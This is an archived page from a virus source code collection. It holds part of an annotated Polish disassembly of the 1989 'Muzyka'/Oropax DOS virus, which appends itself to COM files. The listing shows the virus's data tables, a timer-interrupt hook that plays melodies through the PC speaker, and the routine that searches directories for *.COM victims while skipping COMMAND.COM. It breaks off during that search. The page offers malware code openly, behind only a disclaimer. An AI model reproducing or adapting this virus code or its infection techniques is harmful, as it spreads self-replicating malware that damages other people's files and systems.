<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: oropax___asm</title>
<meta name="KEYWORDS" content="oropax__.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for oropax__.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="oblit_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oblit_pas.php">oblit_pas</a><br>
<a href="odst1028_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/odst1028_pas.php">odst1028_pas</a><br>
<a href="offspr05_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr05_asm.php">offspr05_asm</a><br>
<a href="offspr07_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr07_asm.php">offspr07_asm</a><br>
<a href="offspr81_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr81_asm.php">offspr81_asm</a><br>
<a href="offspr82_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr82_asm.php">offspr82_asm</a><br>
<a href="offspr89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr89_asm.php">offspr89_asm</a><br>
<a href="olo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/olo_asm.php">olo_asm</a><br>
<a href="omega_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/omega_asm.php">omega_asm</a><br>
<a href="one-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/one-13_asm.php">one-13_asm</a><br>
<a href="onkelz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/onkelz_asm.php">onkelz_asm</a><br>
<a href="ontar512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontar512_asm.php">ontar512_asm</a><br>
<a href="ontario0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario0_asm.php">ontario0_asm</a><br>
<a href="ontario3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario3_asm.php">ontario3_asm</a><br>
<a href="ontario_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario_asm.php">ontario_asm</a><br>
<a href="orgasm_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orgasm_pas.php">orgasm_pas</a><br>
<a href="oropax___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax___asm.php">oropax___asm</a><br>
<a href="oropax__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax__asm.php">oropax__asm</a><br>
<a href="oropax_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax_asm.php">oropax_asm</a><br>
<a href="orsam1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam1_asm.php">orsam1_asm</a><br>
<a href="orsam2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam2_asm.php">orsam2_asm</a><br>
<a href="orsam3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam3_asm.php">orsam3_asm</a><br>
<a href="orsam__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam__asm.php">orsam__asm</a><br>
<a href="orsam_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam_asm.php">orsam_asm</a><br>
<a href="osp-07s_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/osp-07s_asm.php">osp-07s_asm</a><br>
<a href="ospring__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring__asm.php">ospring__asm</a><br>
<a href="ospring_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring_asm.php">ospring_asm</a><br>
<a href="otto_415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto_415_asm.php">otto_415_asm</a><br>
<a href="otto-415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto-415_asm.php">otto-415_asm</a><br>
<a href="outland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/outland_asm.php">outland_asm</a><br>
<a href="ow_27_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27_asm.php">ow_27_asm</a><br>
<a href="ow_27b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27b_asm.php">ow_27b_asm</a><br>
<a href="ow_28_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28_asm.php">ow_28_asm</a><br>
<a href="ow_28b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28b_asm.php">ow_28b_asm</a><br>
<a href="ow_30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_30_asm.php">ow_30_asm</a><br>
<a href="ow-30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-30_asm.php">ow-30_asm</a><br>
<a href="ow_32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_32_asm.php">ow_32_asm</a><br>
<a href="ow_37_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_37_asm.php">ow_37_asm</a><br>
<a href="ow_40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_40_asm.php">ow_40_asm</a><br>
<a href="ow_42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42_asm.php">ow_42_asm</a><br>
<a href="ow-42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-42_asm.php">ow-42_asm</a><br>
<a href="ow_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42b_asm.php">ow_42b_asm</a><br>
<a href="ow_44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_44_asm.php">ow_44_asm</a><br>
<a href="ow_64_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_64_asm.php">ow_64_asm</a><br>
<a href="ow_66_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_66_asm.php">ow_66_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Disasemblacja wirusa "muzyka"
;
; Dostarczony przez Z.Kasprzyckiego 20 czerwca 1989
;
; Dokleja od 2756 do 2805 bajt¢w do plik¢w typu COM
;
; òrednio co czwarta instalacja w systemie AT bëdzie dodatkowo prowadziç
; dziaíalnoûç "rozrywkowÜ" czyli odgrywaç jednÜ z zaprogramowanych melodii.
;
; Kod disasemblowany po przesuniëcia wirusa przed zaraßony program
; wirus zostaí zatrzymany przed przystÜpieniem do rëcznej wymiany wektor¢w 
; przerwa§ w CS:0AA4h
;
; CS = 270D

; Tu nastëpuje pierwszy skok do kodu wirusa

0100 E9DD08        JMP     09E0

:--------------------------------------------------------------------------
; dane robocze wirusa
:--------------------------------------------------------------------------

org_4_bajty    db   0, 0, 0, 0    ; cztery oryginalne poczÜtkowe bajty programu

; jakaû flaga systematycznie powiëkszana
; wartoûç 2 jest ustawiana jeûli data systemowa jest wczeûniejsza od 1.5.1989
;   znaczenia:
;     2 - sÜ podmienione wektory przerwa§ prez wirusa
;     0 - nie graj, nie podmieniaj INT 8
;     wartoûç <= 1 w czasie instalacji rezydentnej wirusa powoduje zaniechanie
;     instalowania dziaíalnoûci "rozrywkowej"

L0107  db   0Bh

; adres kontynuacji pracy (wirusa lub oryginalnego programu)

L0108   db   00, 01, CAh, 27h 

int_21h     dd    0        ; wartoûç oryginalnego wektora INT 21h   [010C]
int_27h     dd    0        ; wartoûç oryginalnego wektora INT 27h
int_20h     dd    0        ; wartoûç oryginalnego wektora INT 20h

0118  00 00 00 00          ; ???

int_08h      dd       0    ; wartoûç oryginalnego wektora INT 8h
stare_DTA    dd       0    ; przechowalnia adresu starego DTA (nosiciela)

;----------------------------------------------------------------
; nowe DTA

nowe_DTA        db     21 DUP (0)      ; zarezerwowane dla DOS
atrybut         db      0              ; atrybut znalezionego pliku
czas_pliku      dw      0              ; czas znalezionego pliku
data_pliku      dw      0              ; data znalezionego pliku
rozmiar_pliku   dd      0              ; rozmiar znalezionego pliku 
nazwa_pliku     db     13 DUP (0)      ; nazwa znalezionego pliku ASCIIZ

; koniec DTA
;----------------------------------------------------------------

; tu wirus wczytuje poczÜtkowe cztry bajty kandydata na ofiarë

bufor_kand           db     0         ; 
offset_kodu_wirusa   dw     0         ; w infekowanym pliku
podpis               db     0         ; zakaßone pliki majÜ tu F1h

; jakaû staía inicjalizowana na 14h, wspomaga muzykowanie (?)
; jest systematycznie zmniejszana, jeûli przyjmie wartoûç 0 to melodie nie bëdÜ
; grane, po odegraniu kaßdej melodii jest inicjalizowana na 2

L0153     dw    14h

; wzorzec do poszukiwa§ (?)

wzorzec   db    2Ah, 2Eh, 43h, 4Fh, 4Dh, 00     ; '*.COM', 0

015B  5C      ; '\'

; miejsce na ASCIIZ nowego pliku
; 70 bajt¢w

015C                                      2A 2E 43 4F               *.CO
0160  4D 00 4F 4D 00 2E 43 4F-4D 00 4F 4E 00 00 4C 00   M.OM..COM.ON..L.
0170  4F 4D 00 31 2E 53 4F 42-00 00 2E 43 4F 4D 00 20   OM.1.SOB...COM.
0180  20 2E 20 20 20 00 00 00-00 00 00 00 00 00 00 00       ............
01A0  00 00 00 00 00 00 00 5C                           .......\

; w 01A8 jest pozostawiany ûlad czy pr¢ba infekcji byía udana (??)
; 75 bajt¢w

01A8                          2A 2E 43 4F 4D 00 4F 4D   *.COM.OM
01B0  00 43 4F 4D 00 4D 00 64-5C 2A 2E 43 4F 4D 00 43   .COM.M.d\*.COM.C
01C0  48 50 45 4E 5C 2A 2E 43-4F 4D 00 00 00 00 00 00   HPEN\*.COM......
01D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
01E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
01F0  00 00 00 5C                                       ...\

; obszar budowy nazwy ofiary do zakaßenia
; 80 bajt¢w

01F4              57 41 42 49-4B 43 4F 4D 2E 43 4F 4D   WABIKCOM.COM
0200  00 00 4D 00 5C 2A 2E 43-4F 4D 00 43 48 50 45 4E   ..M.\*.COM.CHPEN
0210  5C 2A 2E 43 4F 4D 00 00-00 00 00 00 00 00 00 00   \*.COM..........
0220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0240  00 00 00 00 

command_com    db    'COMMAND.COM',0      ; nietykalny COM (?!)

; flaga,  1        - ße wektory przerwa§ sÜ juß odtworzone
;         nie zero - nie przeszkadzaj w instalowaniu rezydent¢w
;         0        - wektory przerwa§ sÜ przejëte

L0250          db    01

kolejna_nuta   dw   0255h     ; adres kolejnej nuty (po trzy bajty)

; licznik czasu, jeûli osiÜgnie 0 to rozpoczyna sië odgrywanie melodii
; w czasie grania kom¢rka ta síußy jako flaga okreûlajÜca stan gí¢ûnika
; po zako§czeniu melodii odtwarzana jest wartoûç poczÜtkowa

minut_5   dw    1518h      ; = 5 * 60 * 18 (odpowiednik 5 minut?)


;-------------------------------------------------------------------------
; zapis melodii odgrywanych przez wirusa (po 3 bajty na nutë)

0255                 E4 07 06-E4 07 06 DA 08 03 64 09        d..d..Z..d.
0260  03 64 09 06 F4 09 03 64-09 03 64 09 10 24 00 02   .d..t..d..d..$..
0270  F4 09 03 64 09 03 64 09-06 F4 09 03 64 09 03 E4   t..d..d..t..d..d
0280  07 06 64 09 03 E4 07 03-DA 08 0C 8A 0A 06 24 00   ..d..d..Z.....$.
0290  03 8A 0A 03 8A 0A 06 2C-0B 03 8A 0A 03 8A 0A 06   .......,........
02A0  2C 0B 03 8A 0A 03 DA 08-10 24 00 02 64 09 03 8A   ,.....Z..$..d...
02B0  0A 03 64 09 03 E4 07 09-08 07 09 08 07 03 8A 0A   ..d..d..........
02C0  10 24 00 02 E4 07 06 E4-07 06 DA 08 03 64 09 03   .$..d..d..Z..d..
02D0  64 09 06 F4 09 03 64 09-03 64 09 10 24 00 02 F4   d..t..d..d..$..t
02E0  09 03 64 09 03 64 09 06-F4 09 03 64 09 03 DA 08   ..d..d..t..d..Z.
02F0  03 64 09 03 8A 0A 05 87-0C 01 8A 0A 0C D3 0B 06   .d...........S..
0300  24 00 03 D3 0B 03 D3 0B-06 87 0C 03 D3 0B 03 F4   $..S..S.....S..t
0310  09 06 8A 0A 03 D3 0B 03-E9 05 0F 24 00 03 D3 0B   .....S..i..$..S.
0320  03 8A 0A 03 64 09 03 E4-07 01 24 00 02 D3 0B 03   ....d..d..$..S..
0330  8A 0A 03 64 09 03 E4 07-01 24 00 02 CF 0F 03 16   ...d..d..$..O...
0340  0E 05 64 09 01 8A 0A 0C-D3 0B 01 0A 00 0F CF 0F   ..d.....S.....O.
0350  04 87 0C 04 8A 0A 04 8A-0A 04 24 00 04 45 05 02   ..........$..E..
0360  24 00 02 45 05 02 24 00-06 43 06 02 24 00 02 43   $..E..$..C..$..C
0370  06 02 24 00 06 CF 0F 04-CF 0F 04 87 0C 04 8A 0A   ..$..O..O.......
0380  04 8A 0A 04 24 00 04 45-05 02 24 00 02 45 05 02   ....$..E..$..E..
0390  24 00 06 E9 05 02 24 00-02 E9 05 02 24 00 06 B8   $..i..$..i..$..8
03A0  10 04 B8 10 04 16 0E 04-64 09 04 64 09 04 24 00   ..8.....d..d..$.
03B0  04 B2 04 02 24 00 02 B2-04 02 24 00 06 E9 05 02   .2..$..2..$..i..
03C0  24 00 02 E9 05 02 24 00-06 B8 10 04 B8 10 04 16   $..i..$..8..8...
03D0  0E 04 64 09 04 64 09 04-24 00 04 B2 04 02 24 00   ..d..d..$..2..$.
03E0  02 B2 04 02 24 00 06 43-06 02 24 00 02 43 06 02   .2..$..C..$..C..
03F0  24 00 06 CF 0F 04 CF 0F-04 87 0C 04 8A 0A 04 E4   $..O..O........d
0400  07 04 24 00 04 F2 03 02-24 00 02 F2 03 02 24 00   ..$..r..$..r..$.
0410  06 45 05 02 24 00 02 45-05 02 24 00 06 CF 0F 04   .E..$..E..$..O..
0420  CF 0F 04 87 0C 04 8A 0A-04 E4 07 04 24 00 04 F2   O........d..$..r
0430  03 02 24 00 02 F2 03 02-24 00 06 B2 04 02 24 00   ..$..r..$..2..$.
0440  02 B2 04 02 24 00 06 16-0E 04 16 0E 04 D3 0B 04   .2..$........S..
0450  64 09 02 24 00 02 64 09-0E 24 00 02 2C 0B 04 8A   d..$..d..$..,...
0460  0A 04 43 06 10 E4 07 04-87 0C 04 87 0C 08 16 0E   ..C..d..........
0470  04 64 09 08 8A 0A 04 CF-0F 04 24 00 02 CF 0F 02   .d.....O..$..O..
0480  CF 0F 04 24 00 08 8A 0A-02 24 00 02 D3 0B 02 24   O..$.....$..S..$
0490  00 06 8A 0A 02 24 00 02-D3 0B 02 24 00 06 8A 0A   .....$..S..$....
04A0  04 43 06 10 08 07 04 8A-0A 02 24 00 02 87 0C 02   .C........$.....
04B0  24 00 06 8A 0A 02 24 00-02 87 0C 02 24 00 06 8A   $.....$.....$...
04C0  0A 04 08 07 10 E4 07 04-8A 0A 02 24 00 02 D3 0B   .....d.....$..S.
04D0  02 24 00 06 8A 0A 02 24-00 02 D3 0B 02 24 00 06   .$.....$..S..$..
04E0  8A 0A 04 43 06 10 08 07-04 8A 0A 04 E4 07 04 08   ...C........d...
04F0  07 04 43 06 04 45 05 08-E9 05 04 43 06 02 43 06   ..C..E..i..C..C.
0500  02 43 06 04 08 07 02 24-00 02 E4 07 04 24 00 08   .C.....$..d..$..
0510  0A 00 0F 73 07 02 E4 07-02 E4 07 04 73 07 02 E4   ...s..d..d..s..d
0520  07 02 E4 07 04 73 07 02-E4 07 02 E4 07 04 F8 04   ..d..s..d..d..x.
0530  04 24 00 04 F8 04 02 45-05 02 E9 05 04 E9 05 02   .$..x..E..i..i..
0540  A4 06 02 73 07 04 73 07-02 E4 07 02 DA 08 04 DA   $..s..s..d..Z..Z
0550  08 04 24 00 04 E4 07 02-DA 08 02 DA 08 04 E4 07   ..$..d..Z..Z..d.
0560  02 DA 08 02 DA 08 04 E4-07 02 DA 08 02 DA 08 04   .Z..Z..d..Z..Z..
0570  45 05 04 24 00 04 45 05-02 E9 05 02 43 06 04 43   E..$..E..i..C..C
0580  06 02 73 07 02 E4 07 04-E4 07 02 DA 08 02 F4 09   ..s..d..d..Z..t.
0590  04 F4 09 04 24 00 04 F8-04 02 45 05 02 45 05 04   .t..$..x..E..E..
05A0  6E 04 04 43 06 04 45 05-04 E9 05 04 E4 07 04 24   n..C..E..i..d..$
05B0  00 04 F8 04 02 45 05 02-45 05 04 6E 04 04 43 06   ..x..E..E..n..C.
05C0  04 45 05 04 E9 05 04 F8-04 04 45 05 02 E9 05 02   .E..i..x..E..i..
05D0  A4 06 02 73 07 02 E4 07-04 87 0C 04 D3 0B 04 8A   $..s..d.....S...
05E0  0A 04 F4 09 04 DA 08 02-F4 09 02 8A 0A 04 D3 0B   ..t..Z..t.....S.
05F0  04 E4 07 04 24 00 04 2E-04 08 F2 03 02 24 00 06   .d..$.....r..$..
0600  2E 04 08 F2 03 02 24 00-06 2E 04 08 F2 03 04 2E   ...r..$.....r...
0610  04 04 F2 03 04 2E 04 04-F2 03 04 00 00 0F         ..r.....r.....

; koniec partytury
;----------------------------------------------------------------------------


;------------------------------------------------------------------------
; procedura odpowiedzialna za odgrywanie melodyjki
;------------------------------------------------------------------------

061E FF0E5302      DEC     WORD PTR [minut_5]
0622 A15302        MOV     AX,[minut_5]

0625 3D0100        CMP     AX,0001
0628 7406          JZ      0630         ; wyíÜcz goûnik

062A 3D0000        CMP     AX,0000
062D 740C          JZ      063B         ; kontynuuj z kolejnÜ nutÜ

062F C3            RET

; programowanie ukíadu PPI w celu wyíÜczenia gíoûnika

0630 E461          IN      AL,61        ; odczyt stanu portu
0632 8AE0          MOV     AH,AL
0634 24FC          AND     AL,FC        ; zgaû najnißsze dwa bity (wyíÜcz)
0636 EB00          JMP     0638         ; ? mini pauza ?
0638 E661          OUT     61,AL        ; sterowanie gíoûnika
063A C3            RET

; odegranie melodyjki

063B 8B365102      MOV     SI,[kolejna_nuta]
063F 8306510203    ADD     WORD PTR [kolejna_nuta],+03
0644 8B1C          MOV     BX,[SI]         ; pobranie kolejnej nuty
0646 8A4402        MOV     AL,[SI+02]
0649 98            CBW
064A 83FB0A        CMP     BX,+0A
064D 7702          JA      0651

064F 86C4          XCHG    AH,AL
0651 A35302        MOV     [minut_5],AX    ; przeíÜcz flagë stanu gíoûnika

0654 83FB00        CMP     BX,+00
0657 7508          JNZ     0661            ; odegraj nutë

0659 C70651025502  MOV     WORD PTR [kolejna_nuta],0255 ; wskazuj pierwszÜ nutë
065F EBCF          JMP     0630         ; wyíÜcz gíoûnik

; programowanie ukíadu zegarowego celem generowania muzyki

0661 B0B6          MOV     AL,B6
0663 E643          OUT     43,AL        ; przygotowanie ukíadu 8253-5
0665 8BC3          MOV     AX,BX        ; czëstotliwoûç d¶wiëku
0667 E642          OUT     42,AL        ; wyûlij míodszy bajt
0669 EB00          JMP     066B         ; ? mini pauza ?
066B 8AC4          MOV     AL,AH
066D E642          OUT     42,AL        ; wyûlij starszy bajt
066F E461          IN      AL,61        ; odczyt stanu gíoûnika
0671 8AE0          MOV     AH,AL
0673 0C03          OR      AL,03        ; wíÜcz gíoûnik
0675 EB00          JMP     0677         ; ? mini pauza ?
0677 E661          OUT     61,AL
0679 C3            RET

;------------------------------------------------------------------------
; nowa obsíuga przerwania INT 8h (przerwanie zegarowe)
;------------------------------------------------------------------------

067A 9C            PUSHF
067B 50            PUSH    AX
067C 53            PUSH    BX
067D 51            PUSH    CX
067E 52            PUSH    DX
067F 56            PUSH    SI
0680 57            PUSH    DI
0681 55            PUSH    BP
0682 1E            PUSH    DS
0683 06            PUSH    ES
0684 9C            PUSHF
0685 2E            CS:
0686 FF1E1C01      CALL    FAR [int_08h]

068A FB            STI
068B 8CC8          MOV     AX,CS
068D 8ED8          MOV     DS,AX

068F 833E530100    CMP     WORD PTR [L0153],+00
0694 740F          JZ      06A5

0696 FF0E5301      DEC     WORD PTR [L0153]
069A 7509          JNZ     06A5

069C E87FFF        CALL    061E                       : muzykuj
069F C70653010200  MOV     WORD PTR [L0153],0002

06A5 07            POP     ES
06A6 1F            POP     DS
06A7 5D            POP     BP
06A8 5F            POP     DI
06A9 5E            POP     SI
06AA 5A            POP     DX
06AB 59            POP     CX
06AC 5B            POP     BX
06AD 58            POP     AX
06AE 9D            POPF
06AF CF            IRET

;--------------------------------------------------------------------------
; inicjalizacja staíych roboczych wirusa odpowiedzialnych za muzykowanie
;--------------------------------------------------------------------------

06B0 8CC8          MOV     AX,CS
06B2 8ED8          MOV     DS,AX
06B4 FE060701      INC     BYTE PTR [L0107]
06B8 C606500200    MOV     BYTE PTR [L0250],00
06BD C70653011400  MOV     WORD PTR [L0153],0014    ; inicjalizacja licznika
06C3 C70651025502  MOV     WORD PTR [kolejna_nuta],0255  ; poczÜtek partytury
06C9 C70653021815  MOV     WORD PTR [minut_5],1518  ; wartoûç poczÜtkowa czasu
06CF C3            RET

;--------------------------------------------------------------------------
; kopiowanie ASCIZ ía§cucha
;--------------------------------------------------------------------------

06D0 AC            LODSB
06D1 AA            STOSB
06D2 3C00          CMP     AL,00
06D4 75FA          JNZ     06D0
06D6 C3            RET

;--------------------------------------------------------------------------
; wyszukaj znak lub koniec ASCIIZ ía§cucha
;--------------------------------------------------------------------------

06D7 AC            LODSB
06D8 3A05          CMP     AL,[DI]
06DA 7507          JNZ     06E3          ; AL <> [DI]
06DC 3C00          CMP     AL,00
06DE 7403          JZ      06E3
06E0 47            INC     DI
06E1 EBF4          JMP     06D7
06E3 C3            RET

;--------------------------------------------------------------------------
; budowa nazwy kandydata na ofiarë (?)  na wejûciu DX = ?
;--------------------------------------------------------------------------

06E4 FC            CLD
06E5 8CC8          MOV     AX,CS
06E7 8EC0          MOV     ES,AX
06E9 8BF2          MOV     SI,DX
06EB 8A04          MOV     AL,[SI]
06ED 3C00          CMP     AL,00
06EF 7507          JNZ     06F8

06F1 B419          MOV     AH,19        ; Get current disk
06F3 E8E202        CALL    09D8         ; INT 21h  (A: := numer dysku)
06F6 FEC0          INC     AL           ; konwersja do symbolu ASCII
06F8 0440          ADD     AL,40        ; AL := A, B ...
06FA 2E            CS:
06FB A25C01        MOV     [015C],AL    ; konstrukcja nazwy dysku
06FE 2E            CS:
06FF C6065D013A    MOV     BYTE PTR [015D],3A      ; ':'
0704 2E            CS:
0705 C6065E0100    MOV     BYTE PTR [015E],00      ; ASCIIZ
070A EB0D          JMP     0719

070C FC            CLD
070D 8CC8          MOV     AX,CS
070F 8EC0          MOV     ES,AX
0711 8BF2          MOV     SI,DX
0713 BF5C01        MOV     DI,015C
0716 E8B7FF        CALL    06D0            ; kopiuj ASCII string

; odcinaj nazwë pliku i pozostaw jedynie nazwë katalogu (?)

0719 8CC8          MOV     AX,CS
071B 8ED8          MOV     DS,AX
071D BF5C01        MOV     DI,015C         ; offset ûcießki do ofiary
0720 B000          MOV     AL,00           ; znacznik ko§ca ASCIIZ stringu
0722 B94B00        MOV     CX,004B         ; 75 znak¢w
0725 F2            REPNZ                   ; szukaj
0726 AE            SCASB

0727 8A45FF        MOV     AL,[DI-01]      ; peína nazwa czy tylko dysk?
072A 3C3A          CMP     AL,3A           ; ':'
072C 7407          JZ      0735            ; tylko dysk

072E 3C5C          CMP     AL,5C           ; '\' katalog?
0730 7403          JZ      0735            ; tak

0732 4F            DEC     DI
0733 EBF2          JMP     0727             ; badaj poprzedni znak

0735 BE5501        MOV     SI,offset wzorzec
0738 E895FF        CALL    06D0                ; kopiuj ASCIIZ string
073B BE5C01        MOV     SI,015C
073E BFA801        MOV     DI,01A8
0741 E893FF        CALL    06D7                ; szukaj znaku '\'
0744 7501          JNZ     0747
0746 C3            RET

0747 BE5C01        MOV     SI,015C
074A BFA801        MOV     DI,01A8
074D E880FF        CALL    06D0                ; kopiuj ASCIIZ string
0750 BE5C01        MOV     SI,015C
0753 BFF401        MOV     DI,01F4
0756 E877FF        CALL    06D0
0759 06            PUSH    ES

075A B42F          MOV     AH,2F               ; Get DTA adres
075C E87902        CALL    09D8                ; INT 21h

075F 891E2001      MOV     [stare_DTA],BX
0763 8C062201      MOV     [stare_DTA + 2],ES
0767 07            POP     ES

0768 B41A          MOV     AH,1A             ; set disk transfer address (DTA)
076A BA2401        MOV     DX,nowe_DTA       ; DS:DX
076D E86802        CALL    09D8              ; INT 21h
0770 E81400        CALL    0787              ; zakaßaj
0773 1E            PUSH    DS
0774 B41A          MOV     AH,1A             ; set disk transfer address (DTA)
0776 C5162001      LDS     DX,[stare_DTA]    ; odtwarzaj DTA
077A E85B02        CALL    09D8              ; INT 21h
077D 1F            POP     DS
077E C3            RET

;--------------------------------------------------------------------------
; znajd¶ nastëpnego kandydata na ofiarë
;--------------------------------------------------------------------------

077F B44F          MOV     AH,4F            ; Find next
0781 E85402        CALL    09D8             ; INT 21h
0784 730E          JAE     0794
0786 C3            RET

;--------------------------------------------------------------------------
; wyszukaj ofiarë
;--------------------------------------------------------------------------

0787 B44E          MOV     AH,4E        ; Find First
0789 BA5C01        MOV     DX,015C      ; DS:adres ASCIIZ nazwy (*.COM)
078C B92000        MOV     CX,0020      ; atrybut przeszukiwnia
078F E84602        CALL    09D8         ; INT 21h
0792 72F2          JB      0786         ; nie ma wiëcej potencjalnych ofiar RET

0794 BE4201        MOV     SI,offset nazwa_pliku
0797 BF4402        MOV     DI,offset command_com
079A E83AFF        CALL    06D7         ; sprawd¶ czy to COMMAND.COM
079D 74E0          JZ      077F         ; FindNext

079F 833E400100    CMP     WORD PTR [0140],+00  ; kontrola díugoûci pliku
07A4 75D9          JNZ     077F                 ; ponad 64 Kb, FindNext

; sygnatura dla OROPAX/1 staruje w 07A8

